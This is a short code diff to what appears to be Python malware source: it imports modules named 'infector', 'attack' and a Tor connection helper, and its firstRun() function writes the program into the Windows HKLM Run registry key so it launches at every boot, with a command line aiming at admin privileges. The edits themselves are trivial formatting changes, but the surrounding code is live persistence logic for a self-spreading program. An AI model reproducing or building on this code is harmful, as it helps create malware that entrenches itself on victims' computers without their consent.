@@ -1,4 +1,4 @@
-import infector, attack,Master.torConnection as torConnection
+import infector, attack, Master.torConnection as torConnection
 import time, threading, socket
 
 def firstRun():
@@ -9,7 +9,7 @@ def firstRun():
     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
     # Add the file to the registry
     winreg.SetValueEx(key, "File Name", 0, winreg.REG_SZ, file_path)
-    # Set the file to run with admin privileges
+    # Set the file to run with admin privileges'
     winreg.SetValueEx(key, "File Name", 0, winreg.REG_SZ, "cmd.exe /c start \"\" \"%s\" -runas" % file_path)
     # Close the registry key
     winreg.CloseKey(key)
